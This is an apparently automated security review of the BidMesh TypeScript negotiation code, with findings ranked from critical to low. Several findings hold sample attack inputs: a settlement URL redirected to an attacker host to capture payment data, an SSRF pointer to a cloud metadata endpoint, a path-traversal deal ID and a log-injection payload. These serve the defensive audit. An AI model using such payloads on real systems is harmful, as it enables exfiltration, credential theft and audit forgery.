# BidMesh Security Review — Adversarial Analysis

**Scope:** `src/` (buyer-agent.ts, types.ts, schemas.ts, validation.ts, heuristics.ts, audit.ts, seller-server.ts, demo.ts)
**Date:** 2026-05-04
**Reviewer:** Red-team automated pass (exhaustive)

---

## Summary

| Severity | Count |
|---|---|
| Critical | 5 |
| High | 8 |
| Medium | 7 |
| Low | 4 |

The architecture has two compounding root problems:
1. **All of Developer 1's files are live stubs that throw at runtime** — schemas, validation, heuristics, audit, and the seller server are all `throw new Error(...)`. The buyer agent calls them unconditionally. The entire security model (spend-cap enforcement, audit trail, schema validation) does not exist at runtime.
2. **The buyer agent trusts seller-controlled HTTP responses completely** — prices, URLs, and payment amounts from the seller are used without re-validation.

---

## CRITICAL

---

### C-1: Entire Spend-Cap Enforcement Is a No-Op at Runtime

**Location:** [src/validation.ts:4-11](src/validation.ts) · [src/buyer-agent.ts:277-308](src/buyer-agent.ts)

**Vulnerability:** `validateBuyerAction` unconditionally throws `"not implemented"`. Every call to `validateOutboundOrWalk(...)` in the buyer loop propagates this exception — but no call site wraps the validator in a try/catch. The negotiation loop crashes before any HTTP call is made, meaning the shim never actually runs. If the stub is replaced with a version that always returns `{ allow: true }`, all spend-cap guarantees silently disappear with no test catching it.

**Exploit:**
```
POST /rpc  { "method": "bidmesh.negotiate.open", "initial_offer": 9999 }
# validation.ts throws → buyer crashes → no blocked audit entry written
```
Or swap the stub for `return { allow: true }` — buyer now has zero enforcement.

**Impact:** The core product guarantee ("the agent cannot spend above `max_price`") does not hold. A confused developer, a bad merge, or any stub-survival bug breaks the safety property entirely.

**Severity:** Critical

**Fix:** Guard `validateBuyerAction` to return `{ allow: false, reason: "shim not ready" }` by default (fail-closed), and add a test that confirms a denial for `price > max_price` before any other test can pass.

---

### C-2: Settlement URL Is Attacker-Controlled and Used Without Validation

**Location:** [src/buyer-agent.ts:504](src/buyer-agent.ts) · `acceptAndMaybeSettle`

**Vulnerability:** The settlement URL is taken verbatim from the seller's `AcceptResponse`:
```ts
const proof = await postJson<SettlementProof>(acceptResponse.settlement_url, { ... })
```
The buyer sends payment-confirmation data (deal ID, amount, network, asset) to whatever URL the seller returns. There is no hostname whitelist, no scheme check, and no validation that the URL points to the same host as `sellerUrl`.

**Exploit:**
Malicious seller returns:
```json
{
  "accepted": true,
  "settlement_url": "https://attacker.com/capture",
  "payment_required": { "amount": 4.75, ... }
}
```
The buyer POSTs `{ deal_id, amount, network, asset }` to the attacker's server. In a real x402 flow, this would also send a signed payment token.

**Impact:** SSRF / payment credential exfiltration. Any internal network endpoint reachable from the buyer process is accessible.

**Severity:** Critical

**Fix:** Validate that `settlement_url` is a same-origin URL relative to `sellerUrl` before dereferencing it, e.g.:
```ts
const allowed = new URL(acceptResponse.settlement_url).origin === new URL(sellerUrl).origin;
```

---

### C-3: All Schema Parsers Are Stubs — No Runtime Input Validation on Any Endpoint

**Location:** [src/schemas.ts:4-22](src/schemas.ts)

**Vulnerability:** Every `parse*` function throws immediately. The seller server (when implemented) is documented to call these parsers on inbound HTTP request bodies. Until they are implemented, all inbound JSON is accepted as-is and cast to the expected type. An attacker can send any shape of JSON and the TypeScript cast provides zero runtime protection.

**Exploit:**
```json
POST /rpc
{
  "method": "bidmesh.negotiate.open",
  "body": {
    "initial_offer": -999,
    "quantity": 0,
    "currency": "ETH"
  }
}
```
All fields pass through unvalidated.

**Impact:** The downstream business logic (spend cap, inventory check, floor enforcement) receives garbage inputs. Negative prices, zero quantities, and unsupported currencies all reach the core decision layer.

**Severity:** Critical

**Fix:** Implement Zod schemas before wiring any route; add a CI gate that fails if `parseOpenRequest({})` does not throw.

---

### C-4: Audit Log Is a No-Op — All Security Events Are Silently Dropped

**Location:** [src/audit.ts:4-10](src/audit.ts) · [src/buyer-agent.ts:253-265](src/buyer-agent.ts)

**Vulnerability:** Both `writeBuyerAudit` and `writeSellerAudit` throw immediately. `writeBlockedAudit(...)` in the buyer calls `writeBuyerAudit(...)` — the throw propagates up through `validateOutboundOrWalk(...)` and kills the buyer loop. Any blocked action is not only unlogged; it crashes the agent before the walk signal is sent to the seller.

**Exploit:**
Force a validation denial (any `price > max_price`). The buyer throws instead of walking cleanly. The seller's deal record is left in an open/countering state indefinitely with no audit trail.

**Impact:** No forensic record of any blocked event. Seller-side deal state is leaked (open deal never closed). The audit trail — the only non-LLM safety evidence — does not exist at runtime.

**Severity:** Critical

**Fix:** Replace stub with a real `fs.appendFileSync` implementation that fails closed (logs to stderr on write failure rather than throwing up the stack).

---

### C-5: Seller Server Is a Stub — Zero Authentication, Zero Authorization

**Location:** [src/seller-server.ts:5-7](src/seller-server.ts)

**Vulnerability:** The seller server throws on any call. When eventually implemented, the plan shows zero authentication on any route (`POST /rpc`, `POST /settle/:deal_id`). Any unauthenticated HTTP client can open a deal, counter prices, force acceptance, or mark a deal settled. The `deal_id` is the only access control mechanism, and it is a plain string with no proof of ownership.

**Exploit:**
```
POST /settle/any-deal-id
→ deal marked "settled", inventory decremented, mock payment proof returned
# No buyer signature required. No session token. No prior open required.
```

**Impact:** Inventory can be drained by unauthenticated clients. Any deal can be force-settled without payment. The x402 mock proof is returned for free.

**Severity:** Critical

**Fix:** Require a bearer token or HMAC-signed envelope on all `/rpc` and `/settle/:deal_id` routes; validate `from_pubkey` matches the session before mutating deal state.

---

## HIGH

---

### H-1: `payment_required.amount` From Seller Bypasses the Spend Cap

**Location:** [src/buyer-agent.ts:432-455](src/buyer-agent.ts) · `acceptAndMaybeSettle`

**Vulnerability:** After human confirmation is denied, the code calls `validateOutboundOrWalk` with `acceptResponse.payment_required.amount` — the amount asserted by the seller — not `acceptedPrice` (the buyer's agreed price). A dishonest seller can inflate `payment_required.amount` above `max_price`.

```ts
price: acceptResponse.payment_required.amount,  // seller-supplied
```

After human approval (line 479), the same `payment_required.amount` is validated again. If the seller sets `amount = max_price - epsilon` the validation passes; if they set `amount` above `max_price`, validation blocks — but the buyer already sent `bidmesh.negotiate.accept` with `acceptedPrice`. The seller has a confirmed acceptance in its deal record but the buyer walks. This is an inconsistent state that benefits the seller.

**Impact:** Seller can extract a signed acceptance at a price above `acceptedPrice`, then deny the discrepancy. Spend cap can be violated if `payment_required.amount > max_price` and validation is not yet correctly enforced.

**Severity:** High

**Fix:** Use `acceptedPrice` (buyer-agreed value) for all spend-cap checks; assert `payment_required.amount === acceptedPrice` before proceeding.

---

### H-2: `openResponse.deal_id` Trusted Without Verification

**Location:** [src/buyer-agent.ts:554](src/buyer-agent.ts)

**Vulnerability:**
```ts
const dealId = openResponse.deal_id;
```
The deal ID is a seller-generated string used as the key for all subsequent operations. There is no check that it is a UUID, non-empty, or consistent across rounds. A malicious seller can return a crafted `deal_id` like `"../../../etc/passwd"` (relevant when the seller server writes deal-keyed files) or an empty string (causing subsequent lookups to fail in unpredictable ways).

**Impact:** Path traversal if deal IDs are ever used in file paths; denial of service via empty/null deal ID; replay confusion when a seller reuses the same ID for multiple buyers.

**Severity:** High

**Fix:** Validate `deal_id` is a well-formed UUID (v4) immediately after receiving `OpenResponse`, before storing or using it.

---

### H-3: Replay Attack — No Nonce or Timestamp Validation on Inbound Envelopes

**Location:** [src/types.ts:68-78](src/types.ts) · `NuffEnvelope`

**Vulnerability:** `NuffEnvelope` has a `timestamp` and `expires_at` field, but there is no code anywhere that validates either. The `signature` field is hardcoded to `"mock"` on every outbound envelope. An attacker can capture a valid `bidmesh.negotiate.accept` envelope and replay it against the seller server to trigger a second settlement for the same deal.

**Exploit:**
1. Observe a legitimate accept envelope over the wire.
2. POST the identical envelope body to `/rpc` again.
3. Seller processes it as a new accept (if it doesn't check `phase`).

**Impact:** Double-settlement, inventory double-decrement, or payment-proof duplication.

**Severity:** High

**Fix:** Seller must verify `timestamp` is within a 60-second window and maintain a replay cache of seen `(deal_id, round, signature)` tuples; buyer must generate real signatures.

---

### H-4: Log Injection via Unsanitized `intent.item`, `note`, and `reason`

**Location:** [src/buyer-agent.ts:601-603](src/buyer-agent.ts) · `sendWalk` · `audit.ts` (future)

**Vulnerability:** The walk note includes unsanitized buyer-controlled strings:
```ts
note: `Seller price ${sellerPrice} exceeds max price ${intent.max_price}.`
```
The `intent.item` field (user-supplied) and `note` (partially seller-supplied) are written directly into JSON audit log lines. A newline character in `intent.item` splits one audit record into two, injecting a fabricated record. The `confirmation_summary` in `formatConfirmationSummary` also inlines `intent.item` directly into a display string shown to the human approver — a newline or ANSI escape in the item name can spoof the displayed price.

**Exploit:**
```json
{ "item": "USB-C cable\n{\"action\":\"settled\",\"allowed\":true,\"cap\":0}" }
```
Injects a fake settled audit record.

**Impact:** Audit log forgery; human confirmation UI spoofing.

**Severity:** High

**Fix:** Strip or escape `\n`, `\r`, and ANSI codes from all user-supplied strings before including them in log lines or display output.

---

### H-5: `sellerPrice` Can Be `undefined` and Drive the Negotiation Loop

**Location:** [src/buyer-agent.ts:557](src/buyer-agent.ts) · [src/buyer-agent.ts:573](src/buyer-agent.ts)

**Vulnerability:**
```ts
let sellerPrice = openResponse.counter_price ?? openResponse.price;
```
Both `counter_price` and `price` are optional in `OpenResponse`. If both are absent, `sellerPrice` is `undefined`. The loop condition is `sellerPrice !== undefined`, so the loop exits immediately and the buyer falls through to the terminal `sendWalk` — correct behavior. However, `decideBuyerMove` receives `sellerPrice` typed as `number` but could receive `undefined` if the TypeScript types are loosened by future edits. Additionally, `acceptedPrice: sellerPrice ?? lastBuyerPrice` on line 566 silently accepts at the buyer's own opening offer if the seller sends no price.

**Impact:** Buyer self-accepts at its own opening offer — potentially higher than necessary — without seller agreement.

**Severity:** High

**Fix:** Reject any `OpenResponse` where `accepted === false && counter_price === undefined && price === undefined` with a walk, and assert `sellerPrice` is a finite positive number before every loop iteration.

---

### H-6: No Timeout on HTTP Calls — DoS via Hung Seller

**Location:** [src/buyer-agent.ts:226-238](src/buyer-agent.ts) · `postJson`

**Vulnerability:** `fetch` is called with no `signal` / `AbortController`. A malicious or slow seller can hold the TCP connection open indefinitely, keeping the buyer's Node.js event loop blocked on a single deal indefinitely.

**Exploit:** Seller accepts the connection but never sends a response → buyer hangs forever.

**Impact:** Denial of service against the buyer process; resource exhaustion in multi-deal scenarios.

**Severity:** High

**Fix:**
```ts
const controller = new AbortController();
setTimeout(() => controller.abort(), 10_000);
fetch(url, { signal: controller.signal, ... });
```

---

### H-7: `session_id` Is Hardcoded — All Audit Entries Are Indistinguishable Across Sessions

**Location:** [src/buyer-agent.ts:257](src/buyer-agent.ts)

**Vulnerability:**
```ts
session_id: "demo-session",
```
Every audit entry from every invocation of `runBuyerNegotiation` uses the same session ID. In a multi-session environment (multiple parallel buyers, repeated demo runs), all audit records are attributed to the same session, making forensic analysis impossible and allowing an attacker to obscure malicious activity in a noise of identical session IDs.

**Impact:** Audit trail is useless for attribution; all cross-session replay/correlation is broken.

**Severity:** High

**Fix:** Generate a UUID at the start of `runBuyerNegotiation` and thread it through all audit writes for that invocation.

---

### H-8: `SELLER_URL` Environment Variable Accepted Without Scheme or Host Validation

**Location:** [src/demo.ts:28](src/demo.ts)

**Vulnerability:**
```ts
process.env.SELLER_URL ?? "http://localhost:3001"
```
`SELLER_URL` is passed directly to `runBuyerNegotiation` with no scheme validation, no host allowlist, and no SSRF guard. In a container or cloud environment, `SELLER_URL=http://169.254.169.254/latest/meta-data/` redirects the buyer's opening POST to the cloud metadata service.

**Impact:** SSRF to internal services; credential theft from cloud metadata endpoints.

**Severity:** High

**Fix:** Validate `SELLER_URL` is `http://` or `https://` and optionally enforce a domain allowlist at startup.

---

## MEDIUM

---

### M-1: Float Precision — Spend Cap Comparison Uses `>` Not `>=`

**Location:** `validation.ts` (planned implementation per plan.md)

**Vulnerability:** The plan specifies: "Buyer: reject if `price > intent.max_price`". With IEEE 754 floats, `nextBuyerCounter` or `nextSellerCounter` rounding can produce values like `5.000000000000001` that exceed `max_price = 5.0` and are correctly blocked, or `4.999999999999999` that slip under. More critically, a value exactly equal to `max_price` passes the `>` check and is allowed — but the user expectation may be that `max_price` is an exclusive upper bound.

**Exploit:** Set `max_price = 5.0`, seller settles at `5.0` exactly → validation allows it; user sees a purchase at their stated ceiling.

**Severity:** Medium

**Fix:** Use `price > max_price + Number.EPSILON` or store prices as integer cents to eliminate float comparison ambiguity; document whether `max_price` is inclusive or exclusive.

---

### M-2: `confirmationSummary` Is Pre-Built With Opening Offer, Not Final Price

**Location:** [src/buyer-agent.ts:155-161](src/buyer-agent.ts) · `createBuyerLoopSkeleton`

**Vulnerability:**
```ts
confirmationSummary: formatConfirmationSummary({
  intent,
  sellerPubkey,
  finalPrice: openingOffer   // ← opening offer, not the agreed price
})
```
`createBuyerLoopSkeleton` pre-computes the human confirmation string using the opening offer. If the negotiation settles at a different price, `acceptAndMaybeSettle` correctly calls `formatConfirmationSummary` again with the real price. However, the pre-built skeleton's `confirmationSummary` is a public field on `BuyerLoopSkeleton` — any code that uses `skeleton.confirmationSummary` instead of the re-computed summary will show the wrong price to the human approver.

**Impact:** Human may approve a price they believe is the opening offer while actually authorizing the settled price.

**Severity:** Medium

**Fix:** Remove `confirmationSummary` from `BuyerLoopSkeleton` entirely; only generate the summary at the point of actual confirmation.

---

### M-3: `counterResponse.accepted` Does Not Re-Validate the Accepted Price

**Location:** [src/buyer-agent.ts:664-676](src/buyer-agent.ts)

**Vulnerability:**
```ts
if (counterResponse.accepted) {
  return acceptAndMaybeSettle({
    ...
    acceptedPrice: lastBuyerPrice,   // buyer's last counter, not seller's price
    ...
  });
}
```
When the seller accepts the buyer's counter, `acceptedPrice` is set to `lastBuyerPrice`. But the buyer never checks whether `counterResponse.counter_price` or another seller-supplied field contains a different (higher) price before proceeding. If the seller sends `{ accepted: true, counter_price: 9999 }`, the buyer ignores `counter_price` and settles at `lastBuyerPrice` — which is correct — but the check relies on the absent Zod validation to reject a response that mixes `accepted: true` with a contradictory `counter_price`.

**Severity:** Medium

**Fix:** Assert `!counterResponse.counter_price || counterResponse.counter_price === lastBuyerPrice` when `accepted === true`; reject the response otherwise.

---

### M-4: Walk After Human Denial Goes Through Validation Shim — Creates Deadlock

**Location:** [src/buyer-agent.ts:431-476](src/buyer-agent.ts)

**Vulnerability:** When the human declines payment, the code runs `validateOutboundOrWalk` with `action: "settle"` and `humanConfirmed: false`. If `require_human_confirmation_before_payment` is true (it almost always is), the shim will deny the settle action — correctly. The function then returns `{ settled: false }` but **never sends the walk signal to the seller**. The seller's deal is left in `"accepted"` phase indefinitely.

Looking at the control flow:
```ts
if (!humanConfirmed) {
  const settlementBlocked = !(await validateOutboundOrWalk({ action: "settle", humanConfirmed, ... }));
  if (settlementBlocked) {
    return { settled: false, ... };  // ← returns WITHOUT sending walk
  }
  await sendWalk(...);  // only reached if validation ALLOWS the settle without human confirmation
}
```
`settlementBlocked` is true whenever human confirmation is required — meaning `sendWalk` is never reached on the normal human-denied path.

**Impact:** Seller deal state is permanently "accepted"; inventory remains reserved; seller cannot re-open the deal.

**Severity:** Medium

**Fix:** Always send `sendWalk` when the human denies, regardless of validation result. The validation call on the walk path is architecturally wrong — a walk does not need pre-authorization.

---

### M-5: `max_rounds` Off-by-One — Loop Exits One Round Early

**Location:** [src/buyer-agent.ts:573](src/buyer-agent.ts)

**Vulnerability:**
```ts
while (round < intent.max_rounds && sellerPrice !== undefined) {
```
With `max_rounds = 3`, the loop runs while `round < 3` — i.e., rounds 1 and 2 only. Round 3 is skipped. The buyer never sends a counter on the final round; it falls through to the terminal walk. The plan specifies: "buyer accepts at maxRounds if sellerPrice <= maxPrice". This invariant is never exercised.

**Impact:** Buyer walks one round sooner than intended; seller gets fewer opportunities to converge; the heuristics test "buyer accepts at maxRounds if sellerPrice <= maxPrice" will fail.

**Severity:** Medium

**Fix:** Change the condition to `round <= intent.max_rounds`.

---

### M-6: Dependency Ranges Are All `^` (Minor/Patch) — Supply Chain Risk

**Location:** [package.json:9-18](package.json)

**Vulnerability:**
```json
"express": "^4.18.2",
"zod": "^3.22.4",
"uuid": "^9.0.0"
```
`^` allows any minor or patch update within the major version to be pulled automatically on `npm install`. A compromised patch release of `express`, `zod`, or `uuid` would be installed without any code change. `express ^4.18.2` includes the critical `path-to-regexp` ReDoS vulnerability patched in `4.19.x`.

**Impact:** Supply chain compromise on next `npm install`; known ReDoS in Express routing.

**Severity:** Medium

**Fix:** Pin exact versions (`"express": "4.19.2"`) and use a lockfile (`package-lock.json`) checked into source control; run `npm audit` in CI.

---

### M-7: `intent.item` and `intent.must_have` Are Unbounded Free-Text — No Length Limits

**Location:** [src/types.ts:23-37](src/types.ts) · [src/buyer-agent.ts:111](src/buyer-agent.ts)

**Vulnerability:** `BuyerIntent.item` is `string` with no max length. It is embedded in `intent_summary` sent over HTTP, written to audit logs, and displayed in the human confirmation UI. A 1 MB item name will inflate every log entry, every HTTP payload, and the confirmation display. `must_have: Record<string, string | number | boolean>` has no key or value count limit.

**Impact:** Memory exhaustion in audit log writes; oversized HTTP requests rejected by seller; UI rendering blocked on huge strings.

**Severity:** Medium

**Fix:** Add Zod `.max(256)` on `item`, `.max(64)` on constraint keys, and limit `must_have` to 20 keys.

---

## LOW

---

### L-1: `signature: "mock"` on Every Outbound Envelope

**Location:** [src/buyer-agent.ts:93](src/buyer-agent.ts) · `createEnvelope`

**Vulnerability:** All NuffV1 envelopes are sent with `signature: "mock"`. If any seller implementation validates signatures (as the NuffV1 spec implies), all buyer messages will be rejected. If sellers don't validate (the demo seller won't), the field provides false assurance that envelope integrity is enforced.

**Severity:** Low

**Fix:** Document explicitly that signatures are mocked and add a TODO with the HMAC-SHA256 implementation path.

---

### L-2: `from_pubkey` Is Hardcoded — Cannot Support Multiple Buyer Identities

**Location:** [src/buyer-agent.ts:64](src/buyer-agent.ts)

**Vulnerability:**
```ts
const BUYER_PUBKEY = "mock-buyer-pubkey";
```
This module-level constant means every buyer instance has the same identity. In a multi-buyer environment, all deals are attributed to the same pubkey, making the seller unable to distinguish buyers or enforce per-buyer rate limits.

**Severity:** Low

**Fix:** Accept `buyerPubkey` as a parameter to `runBuyerNegotiation` and thread it through all envelope builders.

---

### L-3: Error Message From Failed HTTP Call Exposes Internal URL Structure

**Location:** [src/buyer-agent.ts:234](src/buyer-agent.ts)

**Vulnerability:**
```ts
throw new Error(`POST ${url} failed with HTTP ${response.status}`);
```
The full URL (including any path segments or query params) is included in the thrown error. `demo.ts` catches and prints this: `console.error(error instanceof Error ? error.message : error)`. In a real deployment, internal topology (seller IP, port, path structure) leaks to stdout.

**Severity:** Low

**Fix:** Log internal URL details at DEBUG level only; surface a generic "negotiation failed" message to user-facing output.

---

### L-4: `dist/` Output Directory Is Not in `.gitignore`

**Location:** Root `.gitignore` (not present in listing)

**Vulnerability:** Compiled JavaScript output in `dist/` may be committed alongside source, leading to stale compiled artifacts that differ from source (a classic audit confusion vector). The `dist/` directory was visible in the `ls` output, suggesting it exists and may contain compiled files.

**Severity:** Low

**Fix:** Add `dist/` and `node_modules/` to `.gitignore`; rely on CI to build from source.

---

## Architectural Risk Summary

The deepest structural problem is the **fail-open stub architecture**. Every security control (validation, audit, schema parsing) is a stub that throws. The system was designed expecting Developer 1 to fill in stubs before integration — but the buyer agent's control flow calls them unconditionally with no fallback. If any stub is replaced by a version that returns permissive results rather than throwing (a natural mistake during incremental implementation), **all safety properties are silently removed** with no test catching the regression.

Recommended remediation priority:
1. Implement `validateBuyerAction` with fail-closed default (C-1)
2. Implement `writeBuyerAudit` with synchronous write (C-4)
3. Validate `settlement_url` is same-origin (C-2)
4. Fix the walk-after-human-denial dead code path (M-4)
5. Fix the off-by-one round counter (M-5)
6. Pin dependency versions and run `npm audit` (M-6)
